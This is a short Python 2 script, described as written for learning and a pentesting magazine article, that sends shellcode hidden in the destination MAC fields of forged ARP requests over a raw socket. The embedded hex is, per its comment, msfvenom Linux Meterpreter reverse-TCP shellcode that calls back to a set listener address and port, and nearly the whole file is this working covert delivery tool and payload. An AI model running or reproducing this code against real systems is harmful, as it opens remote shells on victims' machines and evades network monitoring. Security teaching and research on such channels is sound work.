#!/usr/bin/env python
# Author: Boumediene KADDOUR - OSCP, OSWP
# Created for learning purposes and Pentest Magazine article contribution
# Transfering shellcode via ARP as destination MAC addresses

import socket
import struct
import binascii
from time import sleep

class Injectme:
	def __init__(self, mac):
            self.broadcast = 'ffffffffffff'
            self.myMAC = '000c290e1ec4'
            self.eth_type = 0x0806
            self.mac = mac

	def packet(self):
		#Create Ether Header
		eth_header = struct.pack ("!6s6sH", binascii.unhexlify(self.broadcast), binascii.unhexlify(self.myMAC), self.eth_type)
		return eth_header

	def ARPHeader(self):
    	    hwtype = 0x0001
	    prototype = 0x0800
	    hwsize = 0x06
	    protosize = 0x04
	    opcode = 0x0001
	    source_mac = self.broadcast
	    source_ip = socket.inet_aton('172.16.122.200')
	    dest_mac = self.mac
	    dest_ip = socket.inet_aton('172.16.122.20')
	    arp_request = struct.pack("!HHBBH6s4s6s4s", hwtype, prototype, hwsize, protosize, opcode, source_mac.decode('hex'), source_ip, dest_mac.decode('hex'), dest_ip)
            return arp_request

rawSocket = socket.socket(socket.PF_PACKET,socket.SOCK_RAW, socket.htons(0x0806))
rawSocket.bind(("eth0", socket.htons(0x0806)))

# msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=172.16.122.200 LPORT=4545 -f c

shellcode = ['6a0a5e31dbf7', 'e35343536a02', 'b06689e1cd80', '975b68ac107a', 'c868020011c1', '89e16a665850', '515789e143cd', '8085c079194e', '743d68a20000', '00586a006a05', '89e331c9cd80', '85c079bdeb27', 'b207b9001000', '0089e3c1eb0c', 'c1e30cb07dcd', '8085c078105b', '89e199b60cb0', '03cd8085c078', '02ffe1b80100', '00cd80909090']

for mac in shellcode:
    print mac
    sleep(2)
    obj = Injectme(mac)
    eth_header =  obj.packet()
    arp_request = obj.ARPHeader()
    packet = eth_header + arp_request
    rawSocket.send(packet)

